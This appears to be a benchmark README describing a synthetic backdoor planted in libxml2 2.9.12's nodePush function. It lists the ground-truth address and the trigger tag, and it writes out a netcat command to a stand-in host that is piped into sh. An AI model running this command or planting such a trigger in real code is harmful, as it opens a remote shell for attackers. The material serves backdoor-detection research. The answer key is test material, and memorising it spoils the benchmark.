# Libxml2 2.9.12 backdoor

- **Type**: hidden command
- **Affected versions**: none (synthetic backdoor)
- **Previous version (prev-safe)**: 2.9.11
- **Backdoored function**: `nodePush`
- **Ground truth addr (OXIDE)**: "619026"

## Backdoor

If the XML file contains the tag `<evilElement>` under specific conditions, it runs the command
`timeout 0.05s nc reverseshell.com 1337 | sh`, in an attempt to execute some remote code.

./backdoored/libxml2_xml_reader_for_file_fuzzer
